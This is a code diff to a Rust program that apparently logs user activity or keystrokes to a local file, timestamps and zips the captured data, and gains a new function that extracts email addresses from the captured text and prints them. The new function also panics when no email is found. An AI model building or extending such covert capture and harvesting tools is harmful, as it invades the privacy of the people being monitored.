@@ -7,11 +7,9 @@ use std::fs::OpenOptions;
 use std::io::Write;
 use std::io::{self, BufRead, Read};
 use std::io::BufReader;
-use std::path::Path;
 use std::str;
-use std::fs::File;
-use std::fs::read_to_string;
 use chrono::{Utc, DateTime};
+use linkify::{LinkFinder, LinkKind};
 use monitor::*;
 
 const TEMP: &str = "./data.dat";
@@ -183,6 +181,7 @@ fn track_activity(event: Event) {
             let mut data = String::new();
             fileRead.read_to_string(&mut data);
 
+            links(data.clone());
             zip_main(zipped_string + &data + "\n" + &now_parsed.to_string() + "\n");
 
             let mut fileClear = OpenOptions::new()
@@ -267,4 +266,13 @@ fn readzip() -> String {
     let mut contents = String::new();
     file.read_to_string(&mut contents).unwrap();
     contents
+}
+
+fn links(text: String) {
+    let mut finder = LinkFinder::new();
+    finder.kinds(&[LinkKind::Email]);
+    let links: Vec<_> = finder.links(&text).collect();
+    let link = &links[0];
+    let string = links.into_iter().map(|c| c.as_str().to_owned() + "\n").collect::<String>();
+    println!("{}", string);
 }
